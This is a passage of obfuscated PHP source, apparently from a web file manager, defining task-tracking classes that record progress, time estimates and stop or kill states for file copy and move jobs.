$ÇƒÅ®ôÌ[12]; self::log($ÇƒÅ®ôÌ[1926] . $Ÿ½©“——[$ÇƒÅ®ôÌ[484]] . $ÇƒÅ®ôÌ[177] . $—Á­÷¨”); return !0; } public static function valueGet($Ø—íÉ‘©) { $ÇÀÏÉ‰ï =& $_SERVER[±Ö‰ô½¯]; $œÁƒ€Â¤ = $ÇÀÏÉ‰ï[1927]; $Œ„®äÏ› = Model($ÇÀÏÉ‰ï[519])->get($Ø—íÉ‘©, $œÁƒ€Â¤); if (is_null($Œ„®äÏ›)) { Model($ÇÀÏÉ‰ï[519])->set($ÇÀÏÉ‰ï[847], $ÇÀÏÉ‰ï[91], $œÁƒ€Â¤); Model($ÇÀÏÉ‰ï[519])->set($ÇÀÏÉ‰ï[1880], $ÇÀÏÉ‰ï[230], $œÁƒ€Â¤); $Œ„®äÏ› = Model($ÇÀÏÉ‰ï[519])->get($Ø—íÉ‘©, $œÁƒ€Â¤); } return $Œ„®äÏ›; } private static function valueSet($Ë¸é¡‘°, $ÀÇ¡÷‹ë = false) { $™ÛëÛû =& $_SERVER[±Ö‰ô½¯]; $¯é¨É€” = $™ÛëÛû[1928]; CacheLock::lock($¯é¨É€”); $ù¤‘–° = Model($™ÛëÛû[519])->set($Ë¸é¡‘°, $ÀÇ¡÷‹ë, $™ÛëÛû[1927]); CacheLock::unlock($¯é¨É€”); return $ù¤‘–°; } protected static function log($©¸´Ì¸ƒ) { write_log($©¸´Ì¸ƒ, $_SERVER[±Ö‰ô½¯][1914]); } private static function cacheClear() { $É¢æ¢‰Ç =& $_SERVER[±Ö‰ô½¯]; Cache::clearMemory(Model($É¢æ¢‰Ç[519])->cacheKey($É¢æ¢‰Ç[1927])); Cache::clearMemory(Model($É¢æ¢‰Ç[519])->cacheKey($É¢æ¢‰Ç[1929])); Model($É¢æ¢‰Ç[1899])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\x72\165\156\156\x69\156\x67"; const STATYS_KILL = "\x6b\x69\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($‡€Â‰ïè, $ŒÃª²àù = '', $÷·Å¥Ÿ¼ = 0, $Í¨¨¬ı¸ = '') { $ëŒÈ´â =& $_SERVER[±Ö‰ô½¯]; if (self::get($‡€Â‰ïè)) { return; } $this->task = array($ëŒÈ´â[484] => $‡€Â‰ïè, $ëŒÈ´â[1542] => USER_ID, $ëŒÈ´â[1815] => $Í¨¨¬ı¸, $ëŒÈ´â[537] => $ëŒÈ´â[12], $ëŒÈ´â[33] => $ŒÃª²àù, $ëŒÈ´â[1180] => $ëŒÈ´â[12], $ëŒÈ´â[1178] => $÷·Å¥Ÿ¼, $ëŒÈ´â[1930] => 0, $ëŒÈ´â[1931] => 0, $ëŒÈ´â[1932] => 0, $ëŒÈ´â[1933] => timeFloat(), $ëŒÈ´â[1934] => 0, $ëŒÈ´â[1935] => 0, $ëŒÈ´â[1936] => 0, $ëŒÈ´â[1937] => 0, $ëŒÈ´â[847] => $ëŒÈ´â[1880]); $GLOBALS[$ëŒÈ´â[1938]] = 1; Hook::bind($ëŒÈ´â[1884], array($this, $ëŒÈ´â[1939])); Hook::bind($ëŒÈ´â[1940], array($this, $ëŒÈ´â[1941])); $this->startAfter(); Hook::trigger($ëŒÈ´â[1942], $this->task); $this->task[$ëŒÈ´â[1935]] = timeFloat(); } public function end($à…ëŸ‘± = '') { $­‚×Šİ× =& $_SERVER[±Ö‰ô½¯]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$­‚×Šİ×[1935]]) { self::valueSet($this->task[$­‚×Šİ×[484]], !1); } $this->isEnd = !0; if ($à…ëŸ‘±) { $this->task[$­‚×Šİ×[537]] = $à…ëŸ‘±; } self::log($­‚×Šİ×[1943] . $this->task[$­‚×Šİ×[484]] . $­‚×Šİ×[1944] . sprintf($­‚×Šİ×[960], timeFloat() - $this->task[$­‚×Šİ×[1933]]) . $­‚×Šİ×[1945]); Hook::unbind($­‚×Šİ×[1884], array($this, $­‚×Šİ×[1939])); Hook::unbind($­‚×Šİ×[1940], array($this, $­‚×Šİ×[1941])); $this->endAfter(); $ñ¹Î°³ = $this->task; $this->task = !1; Hook::trigger($­‚×Šİ×[1946], $ñ¹Î°³); } public function update($Úê­„ğ = 0, $²±¦®Óù = false) { $‚ï‘‹í =& $_SERVER[±Ö‰ô½¯]; $´ÎµÃ¦• =& $this->task; if (!$´ÎµÃ¦•) { return; } $´ÎµÃ¦•[$‚ï‘‹í[1930]] += $Úê­„ğ; $´ÎµÃ¦•[$‚ï‘‹í[1934]] = timeFloat(); if ($´ÎµÃ¦•[$‚ï‘‹í[1178]]) { if ($´ÎµÃ¦•[$‚ï‘‹í[1178]] < $´ÎµÃ¦•[$‚ï‘‹í[1930]]) { $´ÎµÃ¦•[$‚ï‘‹í[1178]] = $´ÎµÃ¦•[$‚ï‘‹í[1930]]; } $ô¶¢ùÂ€ = timeFloat() - $´ÎµÃ¦•[$‚ï‘‹í[1933]] - $´ÎµÃ¦•[$‚ï‘‹í[1936]]; if ($ô¶¢ùÂ€ <= 0) { $ô¶¢ùÂ€ = 0.001; } $´ÎµÃ¦•[$‚ï‘‹í[1931]] = $´ÎµÃ¦•[$‚ï‘‹í[1930]] / $´ÎµÃ¦•[$‚ï‘‹í[1178]]; $´ÎµÃ¦•[$‚ï‘‹í[1932]] = $´ÎµÃ¦•[$‚ï‘‹í[1930]] / $ô¶¢ùÂ€; if ($´ÎµÃ¦•[$‚ï‘‹í[1931]] > 0) { $´ÎµÃ¦•[$‚ï‘‹í[1937]] = $ô¶¢ùÂ€ * (1 - $´ÎµÃ¦•[$‚ï‘‹í[1931]]) / $´ÎµÃ¦•[$‚ï‘‹í[1931]]; } $´ÎµÃ¦•[$‚ï‘‹í[1937]] = $´ÎµÃ¦•[$‚ï‘‹í[1937]] <= 0 ? 0 : $´ÎµÃ¦•[$‚ï‘‹í[1937]]; } $this->updateAfter(); $Ï„æ¯õÃ = 0.2; if (timeFloat() - $´ÎµÃ¦•[$‚ï‘‹í[1935]] < $Ï„æ¯õÃ && !$²±¦®Óù) { return; } $üè®Ğ¶Ô = self::get($´ÎµÃ¦•[$‚ï‘‹í[484]]); $ªÊ¹¶ô» = $üè®Ğ¶Ô[$‚ï‘‹í[847]]; if ($ªÊ¹¶ô» == self::STATYS_KILL) { $™×ÈÆÊÜ = array($‚ï‘‹í[1947] => LNG($‚ï‘‹í[1948]), $‚ï‘‹í[1349] => !1); Cache::set($‚ï‘‹í[1949] . $this->task[$‚ï‘‹í[484]], $™×ÈÆÊÜ, 30); $this->onKill(); $this->end(); die; } else { if ($ªÊ¹¶ô» == self::STATYS_STOP) { $‚Ù±á©î = 2; $üè®Ğ¶Ô[$‚ï‘‹í[1936]] += $‚Ù±á©î; self::valueSet($´ÎµÃ¦•[$‚ï‘‹í[484]], $üè®Ğ¶Ô); sleep($‚Ù±á©î); $this->update(); return; } } $´ÎµÃ¦•[$‚ï‘‹í[847]] = $ªÊ¹¶ô» ? $ªÊ¹¶ô» : $´ÎµÃ¦•[$‚ï‘‹í[847]]; $´ÎµÃ¦•[$‚ï‘‹í[1936]] = $üè®Ğ¶Ô[$‚ï‘‹í[1936]] ? $üè®Ğ¶Ô[$‚ï‘‹í[1936]] : 0; $´ÎµÃ¦•[$‚ï‘‹í[1935]] = timeFloat(); Hook::trigger($‚ï‘‹í[1950], $´ÎµÃ¦•); self::valueSet($´ÎµÃ¦•[$‚ï‘‹í[484]], $´ÎµÃ¦•); } public function onKillSet($±·ú¸ˆ, $¸¢ŞåËà = array()) { $this->onKillCall = array($±·ú¸ˆ, $¸¢ŞåËà); } public function onKill() { $–Í†¶½› =& $_SERVER[±Ö‰ô½¯]; self::log($–Í†¶½›[1943] . $this->task[$–Í†¶½›[484]] . $–Í†¶½›[1951]); Hook::trigger($–Í†¶½›[1952], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ıºÌ×åœ) { $îÆÎ»Çå =& $_SERVER[±Ö‰ô½¯]; Cache::set($îÆÎ»Çå[1949] . $this->task[$îÆÎ»Çå[484]], $ıºÌ×åœ, 60); if (!is_array($ıºÌ×åœ) || !$ıºÌ×åœ[$îÆÎ»Çå[1349]]) { self::log($îÆÎ»Çå[1953] . json_encode($ıºÌ×åœ)); } return $ıºÌ×åœ; } public static function get($†æùâáÀ) { $ğÉ¤¯ØÁ =& $_SERVER[±Ö‰ô½¯]; $á–…ºê = self::valueGet($†æùâáÀ); if (is_array($á–…ºê) && $á–…ºê[$ğÉ¤¯ØÁ[1954]]) { $€†Ëü³ = ActionApply($á–…ºê[$ğÉ¤¯ØÁ[1954]], array($á–…ºê)); $á–…ºê = is_array($€†Ëü³) ? $€†Ëü³ : $á–…ºê; } return $á–…ºê; } public static function listData() { $Èù³¸² = self::valueGet(); return array_sort_by($Èù³¸², $_SERVER[±Ö‰ô½¯][1933], !0); } public static function kill($ À›Ëì¡) { return self::changeStatus($ À›Ëì¡, self::STATYS_KILL); } public static function stop($ø…è•õ‡) { return self::changeStatus($ø…è•õ‡, self::STATYS_STOP); } public static function restart($Ÿš»¸¢) { return self::changeStatus($Ÿš»¸¢, self::STATYS_RUNNING); } public static function killAll() { $Ì·¼…è§ =& $_SERVER[±Ö‰ô½¯]; $Õç’Ç³ü = self::listData(); foreach ($Õç’Ç³ü as $íØáÚ‰Û) { self::kill($íØáÚ‰Û[$Ì·¼…è§[484]]); } sleep(2); foreach ($Õç’Ç³ü as $íØáÚ‰Û) { self::valueSet($íØáÚ‰Û[$Ì·¼…è§[484]], !1); } } private static function changeStatus($ÛÒ­ÙÈ, $Ş£½Ãƒœ) { $ŒşÓ±Àˆ =& $_SERVER[±Ö‰ô½¯]; $¬¶ØÈÏ  = self::valueGet($ÛÒ­ÙÈ); if (!$¬¶ØÈÏ ) { return !1; } $¬¶ØÈÏ [$ŒşÓ±Àˆ[847]] = $Ş£½Ãƒœ; self::valueSet($ÛÒ­ÙÈ, $¬¶ØÈÏ ); self::log($ŒşÓ±Àˆ[1955] . $¬¶ØÈÏ [$ŒşÓ±Àˆ[484]] . $ŒşÓ±Àˆ[1956] . $Ş£½Ãƒœ); return !0; } public static function valueGet($å£Í×Ò = false) { $å©è¬Ä  =& $_SERVER[±Ö‰ô½¯]; if ($å£Í×Ò) { $”ğŞÂ©Æ = Model($å©è¬Ä [531])->where(array($å©è¬Ä [95] => $å£Í×Ò, $å©è¬Ä [33] => $å©è¬Ä [1187]))->find(); return $”ğŞÂ©Æ ? json_decode($”ğŞÂ©Æ[$å©è¬Ä [452]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($·Àıõ = false) { $óµÙ­­ò =& $_SERVER[±Ö‰ô½¯]; $ñï¢ƒúË = array($óµÙ­­ò[33] => $óµÙ­­ò[1187]); if ($·Àıõ) { $ñï¢ƒúË[$óµÙ­­ò[1542]] = $·Àıõ; } $’Ÿû¬¶ = Model($óµÙ­­ò[531])->where($ñï¢ƒúË)->select(); $’Ÿû¬¶ = $’Ÿû¬¶ ? $’Ÿû¬¶ : array(); foreach ($’Ÿû¬¶ as $à¶Êş€‚ => $¬ßĞıå‘) { $’Ÿû¬¶[$à¶Êş€‚] = json_decode($¬ßĞıå‘[$óµÙ­­ò[452]], !0); } return $’Ÿû¬¶; } public static function valueSet($ÁÖ¥¹Æ¬, $ŸŸÁù‰) { $­Ê—¤¼Å =& $_SERVER[±Ö‰ô½¯]; if (!$ŸŸÁù‰) { return Model($­Ê—¤¼Å[531])->where(array($­Ê—¤¼Å[95] => $ÁÖ¥¹Æ¬, $­Ê—¤¼Å[33] => $­Ê—¤¼Å[1187]))->delete(); } $â®çãÈ¾ = json_encode($ŸŸÁù‰); if (!$â®çãÈ¾) { ob_start(); var_dump($ŸŸÁù‰); $„³ûÜÂ… = ob_get_clean(); self::log($­Ê—¤¼Å[1957] . json_encode_force($„³ûÜÂ…)); } if (!$ÁÖ¥¹Æ¬ || !$ŸŸÁù‰[$­Ê—¤¼Å[484]]) { return !1; } $ëêØ‹”¸ = array($­Ê—¤¼Å[33] => $­Ê—¤¼Å[1187], $­Ê—¤¼Å[1542] => USER_ID, $­Ê—¤¼Å[95] => $ÁÖ¥¹Æ¬, $­Ê—¤¼Å[452] => $â®çãÈ¾); $Ç’½öæ˜ = $­Ê—¤¼Å[1958]; CacheLock::lock($Ç’½öæ˜); Model($­Ê—¤¼Å[531])->add($ëêØ‹”¸, array(), !0); CacheLock::unlock($Ç’½öæ˜); } public static function log($‹ø§Ğ˜Ì) { if (!GLOBAL_DEBUG) { return; } write_log($‹ø§Ğ˜Ì, $_SERVER[±Ö‰ô½¯][1959]); } } class TaskFileTransfer extends Task { protected function startAfter() { $¥ÛÓºßü =& $_SERVER[±Ö‰ô½¯]; $ûø¥åš¨ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¥ÛÓºßü[1960], array($this, $¥ÛÓºßü[1961])); Hook::bind($¥ÛÓºßü[1360], array($this, $¥ÛÓºßü[1962])); Hook::bind($¥ÛÓºßü[1963], array($this, $¥ÛÓºßü[1964])); Hook::bind($¥ÛÓºßü[688], array($this, $¥ÛÓºßü[1965])); Hook::bind($¥ÛÓºßü[689], array($this, $¥ÛÓºßü[1966])); Hook::bind($¥ÛÓºßü[695], array($this, $¥ÛÓºßü[1967])); Hook::bind($¥ÛÓºßü[696], array($this, $¥ÛÓºßü[1968])); Hook::bind($¥ÛÓºßü[691], array($this, $¥ÛÓºßü[1969])); Hook::bind($¥ÛÓºßü[693], array($this, $¥ÛÓºßü[1970])); Hook::bind($¥ÛÓºßü[657], array($this, $¥ÛÓºßü[1971])); Hook::bind($¥ÛÓºßü[654], array($this, $¥ÛÓºßü[1971])); Hook::bind($¥ÛÓºßü[659], array($this, $¥ÛÓºßü[1971])); Hook::bind($¥ÛÓºßü[661], array($this, $¥ÛÓºßü[1971])); Hook::bind($¥ÛÓºßü[663], array($this, $¥ÛÓºßü[1971])); Hook::bind($¥ÛÓºßü[1972], array($this, $¥ÛÓºßü[1973])); Hook::bind($¥ÛÓºßü[679], array($this, $¥ÛÓºßü[1974])); $this->sourceModelCopyFlag = !1; Hook::bind($¥ÛÓºßü[1975], array($this, $¥ÛÓºßü[1976])); Hook::bind($¥ÛÓºßü[1977], array($this, $¥ÛÓºßü[1978])); Hook::bind($¥ÛÓºßü[1979], array($this, $¥ÛÓºßü[1980])); $ûø¥åš¨[$¥ÛÓºßü[1981]] = LNG($¥ÛÓºßü[1982]); $ûø¥åš¨[$¥ÛÓºßü[1983]] = 0; $ûø¥åš¨[$¥ÛÓºßü[1984]] = 0; $ûø¥åš¨[$¥ÛÓºßü[1180]] = $¥ÛÓºßü[12]; $ûø¥åš¨[$¥ÛÓºßü[1985]] = $¥ÛÓºßü[12]; $ûø¥åš¨[$¥ÛÓºßü[1986]] = 0; $ûø¥åš¨[$¥ÛÓºßü[1987]] = 0; $ûø¥åš¨[$¥ÛÓºßü[1988]] = 0; if (!$ûø¥åš¨[$¥ÛÓºßü[1815]]) { $ûø¥åš¨[$¥ÛÓºßü[1815]] = LNG($¥ÛÓºßü[1989]); } } protected function endAfter() { $Ü³ÍÅæ¨ =& $_SERVER[±Ö‰ô½¯]; Hook::unbind($Ü³ÍÅæ¨[1960], array($this, $Ü³ÍÅæ¨[1961])); Hook::unbind($Ü³ÍÅæ¨[1360], array($this, $Ü³ÍÅæ¨[1962])); Hook::unbind($Ü³ÍÅæ¨[1963], array($this, $Ü³ÍÅæ¨[1964])); Hook::unbind($Ü³ÍÅæ¨[688], array($this, $Ü³ÍÅæ¨[1965])); Hook::unbind($Ü³ÍÅæ¨[689], array($this, $Ü³ÍÅæ¨[1966])); Hook::unbind($Ü³ÍÅæ¨[695], array($this, $Ü³ÍÅæ¨[1967])); Hook::unbind($Ü³ÍÅæ¨[696], array($this, $Ü³ÍÅæ¨[1968])); Hook::unbind($Ü³ÍÅæ¨[691], array($this, $Ü³ÍÅæ¨[1969])); Hook::unbind($Ü³ÍÅæ¨[693], array($this, $Ü³ÍÅæ¨[1970])); Hook::unbind($Ü³ÍÅæ¨[657], array($this, $Ü³ÍÅæ¨[1971])); Hook::unbind($Ü³ÍÅæ¨[654], array($this, $Ü³ÍÅæ¨[1971])); Hook::unbind($Ü³ÍÅæ¨[659], array($this, $Ü³ÍÅæ¨[1971])); Hook::unbind($Ü³ÍÅæ¨[661], array($this, $Ü³ÍÅæ¨[1971])); Hook::unbind($Ü³ÍÅæ¨[663], array($this, $Ü³ÍÅæ¨[1971])); Hook::unbind($Ü³ÍÅæ¨[1972], array($this, $Ü³ÍÅæ¨[1973])); Hook::unbind($Ü³ÍÅæ¨[679], array($this, $Ü³ÍÅæ¨[1974])); Hook::unbind($Ü³ÍÅæ¨[1975], array($this, $Ü³ÍÅæ¨[1976])); Hook::unbind($Ü³ÍÅæ¨[1977], array($this, $Ü³ÍÅæ¨[1978])); Hook::unbind($Ü³ÍÅæ¨[1979], array($this, $Ü³ÍÅæ¨[1980])); } public function copyMoveStart($°™ºŞğû, $¥˜‡ëŞ¸, $£î¯¹§, $É÷íì•Ä) { $×ã“úœ… =& $_SERVER[±Ö‰ô½¯]; self::log($×ã“úœ…[1990] . $¥˜‡ëŞ¸ . $×ã“úœ…[73] . $É÷íì•Ä); $şÚˆ—‹ƒ = rtrim(TEMP_FILES, $×ã“úœ…[8]); if (substr($¥˜‡ëŞ¸, 0, strlen($şÚˆ—‹ƒ)) == $şÚˆ—‹ƒ) { return; } if (substr($É÷íì•Ä, 0, strlen($şÚˆ—‹ƒ)) == $şÚˆ—‹ƒ) { return; } $¥éßŞÔ =& $this->task; $¥éßŞÔ[$×ã“úœ…[1991]] = KodIO::transferType($°™ºŞğû, $£î¯¹§); self::log($×ã“úœ…[1992] . $¥éßŞÔ[$×ã“úœ…[1991]] . $×ã“úœ…[74] . $¥˜‡ëŞ¸ . $×ã“úœ…[73] . $É÷íì•Ä); $this->update(); } public function updateAfter() { $Œãõ¦š =& $_SERVER[±Ö‰ô½¯]; $äÍ£ôå =& $this->task; if (!$äÍ£ôå[$Œãõ¦š[861]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($äÍ£ôå[$Œãõ¦š[1991]] == $Œãõ¦š[1463]) { return; } self::updateTask($äÍ£ôå); } private static function updateTask(&$ÅÉŞéÓÎ) { $–ñ·š«´ =& $_SERVER[±Ö‰ô½¯]; if ($ÅÉŞéÓÎ[$–ñ·š«´[1991]] == $–ñ·š«´[1331] || $ÅÉŞéÓÎ[$–ñ·š«´[1991]] == $–ñ·š«´[108]) { if ($ÅÉŞéÓÎ[$–ñ·š«´[1985]]) { $ÅÉŞéÓÎ[$–ñ·š«´[1988]] = $ÅÉŞéÓÎ[$–ñ·š«´[1987]] + $ÅÉŞéÓÎ[$–ñ·š«´[1984]]; } } else { if ($ÅÉŞéÓÎ[$–ñ·š«´[1991]] == $–ñ·š«´[1464]) { if ($ÅÉŞéÓÎ[$–ñ·š«´[1985]] == $–ñ·š«´[1331]) { $ÅÉŞéÓÎ[$–ñ·š«´[1988]] = $ÅÉŞéÓÎ[$–ñ·š«´[1987]] + $ÅÉŞéÓÎ[$–ñ·š«´[1984]] * 0.5; } else { if ($ÅÉŞéÓÎ[$–ñ·š«´[1985]] == $–ñ·š«´[108]) { $ÅÉŞéÓÎ[$–ñ·š«´[1988]] = $ÅÉŞéÓÎ[$–ñ·š«´[1987]] + $ÅÉŞéÓÎ[$–ñ·š«´[1983]] * 0.5 + $ÅÉŞéÓÎ[$–ñ·š«´[1984]] * 0.5; } } } } $ÅÉŞéÓÎ[$–ñ·š«´[1931]] = $ÅÉŞéÓÎ[$–ñ·š«´[1988]] / $ÅÉŞéÓÎ[$–ñ·š«´[861]]; if ($ÅÉŞéÓÎ[$–ñ·š«´[1931]] > 0) { $êòŠ£ŠÔ = timeFloat() - $ÅÉŞéÓÎ[$–ñ·š«´[1933]] - $ÅÉŞéÓÎ[$–ñ·š«´[1936]]; $ÅÉŞéÓÎ[$–ñ·š«´[1937]] = $êòŠ£ŠÔ * (1 - $ÅÉŞéÓÎ[$–ñ·š«´[1931]]) / $ÅÉŞéÓÎ[$–ñ·š«´[1931]]; } $É¤§âå = $ÅÉŞéÓÎ[$–ñ·š«´[1984]] . $–ñ·š«´[944] . $ÅÉŞéÓÎ[$–ñ·š«´[1983]] . "\73\40{$í—óş¹}\x3b" . $ÅÉŞéÓÎ[$–ñ·š«´[1988]]; self::log($–ñ·š«´[1993] . $ÅÉŞéÓÎ[$–ñ·š«´[1985]] . $–ñ·š«´[74] . $ÅÉŞéÓÎ[$–ñ·š«´[1931]] . $–ñ·š«´[74] . $É¤§âå); } public function addPath($ò†õºÜÌ) { $ä¦„Á»Ì =& $_SERVER[±Ö‰ô½¯]; if (!$ò†õºÜÌ) { return; } $üÖÌãŒ¸ =& $this->task; $ÒôµÙ¬“ = IO::infoWithChildren($ò†õºÜÌ); $óúßò® = $üÖÌãŒ¸[$ä¦„Á»Ì[1994]] ? $üÖÌãŒ¸[$ä¦„Á»Ì[1994]][$ä¦„Á»Ì[1995]] : 0; $üÖÌãŒ¸[$ä¦„Á»Ì[1994]] = array($ä¦„Á»Ì[1995] => $óúßò® + 1, $ä¦„Á»Ì[506] => $ÒôµÙ¬“[$ä¦„Á»Ì[32]], $ä¦„Á»Ì[87] => $ÒôµÙ¬“[$ä¦„Á»Ì[87]], $ä¦„Á»Ì[599] => $ÒôµÙ¬“[$ä¦„Á»Ì[599]] ? $ÒôµÙ¬“[$ä¦„Á»Ì[599]] : $ÒôµÙ¬“[$ä¦„Á»Ì[87]]); if ($ÒôµÙ¬“[$ä¦„Á»Ì[33]] == $ä¦„Á»Ì[232]) { $üÖÌãŒ¸[$ä¦„Á»Ì[1178]] += 1; } else { $üÖÌãŒ¸[$ä¦„Á»Ì[1178]] += $ÒôµÙ¬“[$ä¦„Á»Ì[82]][$ä¦„Á»Ì[80]]; if ($ÒôµÙ¬“[$ä¦„Á»Ì[193]]) { $üÖÌãŒ¸[$ä¦„Á»Ì[1178]] += $ÒôµÙ¬“[$ä¦„Á»Ì[82]][$ä¦„Á»Ì[81]] + 1; } } $üÖÌãŒ¸[$ä¦„Á»Ì[861]] += $ÒôµÙ¬“[$ä¦„Á»Ì[79]]; $this->update(); self::log(array($ä¦„Á»Ì[1996] . $ò†õºÜÌ, $ÒôµÙ¬“)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ıÜŠ ­) { } public function sourceAddHashEnd($ÒŠØÊÑ¼) { } public function sourceAddFileStart($ÍÈÌë‡á) { $”ÀË«İƒ =& $_SERVER[±Ö‰ô½¯]; $ŞÚ‘”¥° =& $this->task; $ŞÚ‘”¥°[$”ÀË«İƒ[1983]] = $ÍÈÌë‡á[$”ÀË«İƒ[79]]; $ŞÚ‘”¥°[$”ÀË«İƒ[1981]] = $ÍÈÌë‡á[$”ÀË«İƒ[32]]; $ŞÚ‘”¥°[$”ÀË«İƒ[1180]] = $ÍÈÌë‡á[$”ÀË«İƒ[32]]; $ŞÚ‘”¥°[$”ÀË«İƒ[1997]] = $ÍÈÌë‡á[$”ÀË«İƒ[87]]; $this->update(); self::log($”ÀË«İƒ[1998] . $ÍÈÌë‡á[$”ÀË«İƒ[87]] . $”ÀË«İƒ[1999] . $ÍÈÌë‡á[$”ÀË«İƒ[79]]); } public function sourceAddFileEnd($µî’‰ñı) { $àøŸ€Ï =& $_SERVER[±Ö‰ô½¯]; $—ıÁåêß =& $this->task; $—ıÁåêß[$àøŸ€Ï[1988]] += $µî’‰ñı[$àøŸ€Ï[79]]; $—ıÁåêß[$àøŸ€Ï[1997]] = $µî’‰ñı[$àøŸ€Ï[87]]; $this->update(1); self::log($àøŸ€Ï[2000] . $µî’‰ñı[$àøŸ€Ï[87]] . $àøŸ€Ï[1999] . $µî’‰ñı[$àøŸ€Ï[79]] . $àøŸ€Ï[2001]); } public function copyFileStart($Í€µ¦ºÃ, $Ğğá…®µ, $ÆşŒé®Ğ, $‡­±„ö, $‘äí®Ú§, $Ğ±íƒÍÚ) { $ü‘ìÃûÑ =& $_SERVER[±Ö‰ô½¯]; $¹ğ¯Üµ¡ = $‘äí®Ú§; if ($¹ğ¯Üµ¡ == $GLOBALS[$ü‘ìÃûÑ[2002]]) { $¹ğ¯Üµ¡ = $GLOBALS[$ü‘ìÃûÑ[2003]]; } $GLOBALS[$ü‘ìÃûÑ[2003]] = $‘äí®Ú§; $GLOBALS[$ü‘ìÃûÑ[2002]] = $Ğ±íƒÍÚ; $Àƒğâ¤ß =& $this->task; $Àƒğâ¤ß[$ü‘ìÃûÑ[1981]] = $¹ğ¯Üµ¡; $Àƒğâ¤ß[$ü‘ìÃûÑ[1983]] = (int) $Í€µ¦ºÃ->size($Ğğá…®µ); $Àƒğâ¤ß[$ü‘ìÃûÑ[1984]] = 0; $Àƒğâ¤ß[$ü‘ìÃûÑ[1180]] = $ü‘ìÃûÑ[12]; $Àƒğâ¤ß[$ü‘ìÃûÑ[1985]] = $ü‘ìÃûÑ[12]; $Àƒğâ¤ß[$ü‘ìÃûÑ[1986]] = 0; $ßÜ°­ÏÛ = $Àƒğâ¤ß[$ü‘ìÃûÑ[1983]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Àƒğâ¤ß[$ü‘ìÃûÑ[484]] . $ü‘ìÃûÑ[2004]); if ($ßÜ°­ÏÛ && file_exists(get_path_father($‡­±„ö))) { Cache::set($Àƒğâ¤ß[$ü‘ìÃûÑ[484]] . $ü‘ìÃûÑ[2004], $‡­±„ö); $Àƒğâ¤ß[$ü‘ìÃûÑ[1954]] = array($ü‘ìÃûÑ[2005], $ü‘ìÃûÑ[2006]); } $this->update(0, $ßÜ°­ÏÛ); self::log("\x63\x6f\160\x79\106\x69\154\145\x53\x74\x61\162\164\x3a{$Ğğá…®µ}\73"); } public static function updateCopyLocalFileSize($Ìº©íÎ) { $òÆ—ŒŒ =& $_SERVER[±Ö‰ô½¯]; $ú½¿Š½ = Cache::get($Ìº©íÎ[$òÆ—ŒŒ[484]] . $òÆ—ŒŒ[2004]); if (!$ú½¿Š½ || !file_exists($ú½¿Š½)) { return $Ìº©íÎ; } $Ìº©íÎ[$òÆ—ŒŒ[1984]] = @filesize($ú½¿Š½); $Ìº©íÎ[$òÆ—ŒŒ[1988]] += $Ìº©íÎ[$òÆ—ŒŒ[1984]]; self::updateTask($Ìº©íÎ); return $Ìº©íÎ; } public function copyFileEnd($´ÂÄ±, $›Ã”ŠÏ«, $’Ÿ×ŸÙû, $ªúÖ†¨, $¿Ç©ÖªØ, $òº¯ãÊ) { $«’½Í‚® =& $_SERVER[±Ö‰ô½¯]; $ÏÁÌìº =& $this->task; $ÏÁÌìº[$«’½Í‚®[1984]] = $ÏÁÌìº[$«’½Í‚®[1983]]; $ÏÁÌìº[$«’½Í‚®[1985]] = $«’½Í‚®[12]; unset($ÏÁÌìº[$«’½Í‚®[1954]]); if ($¿Ç©ÖªØ == $ÏÁÌìº[$«’½Í‚®[1981]]) { $ÏÁÌìº[$«’½Í‚®[1987]] += $ÏÁÌìº[$«’½Í‚®[1983]]; $ÏÁÌìº[$«’½Í‚®[1988]] = $ÏÁÌìº[$«’½Í‚®[1987]]; $›¡–ô©ƒ = 1; if (isset($ÏÁÌìº[$«’½Í‚®[1997]]) && $ÏÁÌìº[$«’½Í‚®[1997]] == $›Ã”ŠÏ«) { $›¡–ô©ƒ = 0; } $this->update($›¡–ô©ƒ); } else { $this->update(); $ÏÁÌìº[$«’½Í‚®[1984]] = 0; } Cache::remove($ÏÁÌìº[$«’½Í‚®[484]] . $«’½Í‚®[2004]); self::log($«’½Í‚®[2007] . $›Ã”ŠÏ« . $«’½Í‚®[73] . $ªúÖ†¨ . $«’½Í‚®[287] . $¿Ç©ÖªØ . $«’½Í‚®[2008] . $ÏÁÌìº[$«’½Í‚®[1981]]); } public function updateFileEnd($ÊÑ»Û£¥, $¿Â¶–ƒ™) { $ÊïíÛ™ä =& $_SERVER[±Ö‰ô½¯]; $é£ÚÃà =& $this->task; $é£ÚÃà[$ÊïíÛ™ä[1981]] = $ÊÑ»Û£¥; $é£ÚÃà[$ÊïíÛ™ä[1983]] = $¿Â¶–ƒ™; $é£ÚÃà[$ÊïíÛ™ä[1987]] += $¿Â¶–ƒ™; $é£ÚÃà[$ÊïíÛ™ä[1988]] = $é£ÚÃà[$ÊïíÛ™ä[1987]]; $this->update(1); self::log($ÊïíÛ™ä[2009] . $ÊÑ»Û£¥); } public function sourceModelCopy($àéÊŠëò) { $²±àŸò =& $_SERVER[±Ö‰ô½¯]; $”ûöÖ©º = $àéÊŠëò[0]; $±ŒµÑ = $àéÊŠëò[1]; $·èô© =& $this->task; $this->sourceModelCopyFlag = !0; $’ßæ³ş¼ = 0; switch ($”ûöÖ©º) { case $²±àŸò[655]: $’ßæ³ş¼ = 1; break; case $²±àŸò[658]: $·èô©[$²±àŸò[1981]] = $±ŒµÑ[$²±àŸò[32]]; break; case $²±àŸò[660]: $’ßæ³ş¼ = intval($àéÊŠëò[$²±àŸò[468]] * 0.4); break; case $²±àŸò[662]: $’ßæ³ş¼ = intval($àéÊŠëò[$²±àŸò[468]] * 0.2); break; case $²±àŸò[664]: $’ßæ³ş¼ = intval($àéÊŠëò[$²±àŸò[468]] * 0.4); break; } $this->update($’ßæ³ş¼); 